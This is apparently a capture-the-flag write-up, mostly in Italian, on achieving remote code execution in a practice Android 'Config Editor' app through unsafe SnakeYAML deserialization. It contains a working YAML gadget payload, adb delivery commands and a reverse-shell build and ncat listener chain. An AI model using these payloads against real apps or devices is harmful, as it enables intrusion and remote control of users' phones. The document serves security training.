# Config Editor

Achieve Remote Code Execution via a Config Editor app in Android by exploiting vulnerabilities in a third party library.

## Table of Contents

1. [Look Around](#look-around)
2. [Static Analysis](#static-analysis)
3. [Dynamic Analysis](#dynamic-analysis)
4. [Exploiting](#exploiting)
5. [Shell is the way](#shell-is-the-way)
6. [And now?](#and-now)
7. [Utils](#utils)
8. [References](#references)

## Look Around

L'applicazione viene utilizzata per leggere file con estensione `.yaml`

## Static Analysis

Considerazioni sul file `AndroidManifest.xml`

### Permissions

+ `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE`, `MANAGE_EXTERNAL_STORAGE` , permessi per permettere all'applicazione di potere salvare, leggere e scrivere file sulla memoria esterna `sdcard`
+ `INTERNET` , utilizzata per accedere ad Internet

```xml
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
```

### Implicitly Exported Component

An implicitly exported component could allow access to the component Activity, MainActivity.
In questo caso, l'applicazione gestirà i link con scheme `file://`, `http://` e `https://` e file con estensione  `.yaml`

```xml
       <activity android:name="com.mobilehackinglab.configeditor.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="file"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:mimeType="application/yaml"/>
            </intent-filter>
        </activity>
```

### MainActivity & yaml.load

`loadYaml` funzione interessante al suo interno: `Object deserializedData = yaml.load(inputStream);`
Vediamo, attraverso gli `import` nell'app e nelle subdirectory presenti `/org/yaml/snakeyaml` che il metodo `load`
proviene da SnakeYAML.
Da documentazione: `SnakeYAML is a YAML 1.1 processor for the Java Virtual Machine version 8+.`
Cercando su internet per SnakeYAML e Deserialization notiamo che [CVE](https://nvd.nist.gov/vuln/detail/CVE-2022-1471)

```txt
SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization. We recommend upgrading to version 2.0 and beyond.
```

Non sono stato in grado di trovare la versione esatta di SnakeYAML ma cercando per SnakeYaml's `SafeConsturctor` in `/org/yaml/snakeyaml` non troviamo occorrenze quindi ho presupposto fosse una buona strada da perseguire.

## Dynamic Analysis

Sanity check:

1. Crea un file `yaml`
2. Metti in ascolto un listener python sulla porta 8080
3. Simula una connessione http con un file yaml con adb
L'applicazione dovrebbe aprirsi e tenterà di leggere il file (se vuoto, l'output sarà vuoto)

Commands:

```sh
$linux> touch example.yaml
$linux> python3 -m http.server 8080
$linux> adb shell am start -a android.intent.action.VIEW -d  "http://$IP:8080/example.yaml" -n com.mobilehackinglab.configeditor/.MainActivity
```

## Exploiting

Adattamento SnakeYAML per la nostra App Android.

Nel path `/com/mobilehackinglab/configeditor/LegacyCommandUtil.java`
che ci può permettere tramite deserializzazione di richiamare LegacyCommandUtil ed eseguire comandi di sistema.

```java
public final class LegacyCommandUtil {
    public LegacyCommandUtil(String command) {
        Intrinsics.checkNotNullParameter(command, "command");
        Runtime.getRuntime().exec(command);
    }
}
```

Creiamo file `yaml`

```yaml
pwn: !!com.mobilehackinglab.configeditor.LegacyCommandUtil [ "/bin/touch /data/data/com.mobilehackinglab.configeditor/pwn.txt" ]
```

Testiamo questa RCE

```sh
$linux> touch pwn.yaml
$linux> python3 -m http.server 8080
$linux> adb shell am start -a android.intent.action.VIEW -d  "http://$IP:8080/pwn.yaml" -n com.mobilehackinglab.configeditor/.MainActivity
$linux> adb shell ls /data/data/com.mobilehackinglab.configeditor
output: pwn.txt # in listing file
```

<p align="center">
<img src="assets/pwn.png" width="500"/>
</p>

## Shell is the way

Creare reverse shell in Java

```sh
javac --release 17 AndroidReverseShell.java
mkdir classes
/Users/dipa/Library/Android/sdk/build-tools/33.0.2/d8 AndroidReverseShell.class --intermediate --file-per-class --output classes
mv classes/AndroidReverseShell.dex classes/classes.dex
zip classes/reverse.jar classes/classes.dex
# manual way, skip this, use only for testing
adb push reverse.jar /data/data/com.mobilehackinglab.configeditor/
/system/bin/dalvikvm -cp /data/data/com.mobilehackinglab.configeditor/reverse.jar AndroidReverseShell
```

```sh
python3 -m http.server 8081 # shell.yaml and reverse.jar in this folder
ncat -lnvp 1337 # listener for reverse shell
adb shell am start -a android.intent.action.VIEW -d  "http://192.168.1.26:8081/shell.yaml" -n com.mobilehackinglab.configeditor/.MainActivity # emulate browser interaction
```

![Alt Text](assets/exploit.gif)

## And now?

RCE / ACE su utente Android non ci dà molti privilegi e non possiamo muoverci liberamente nel file system. Quali sono i passi successivi?

### Android Kernel Privesc & SandBox Escape

+ Android Kernel Privesc, Sandbox Escape, etc

## Utils

+ SemGrep Rules

## References

+ [android-command-line-reverse-shell](https://malacupa.com/2018/10/25/android-command-line-reverse-shell)
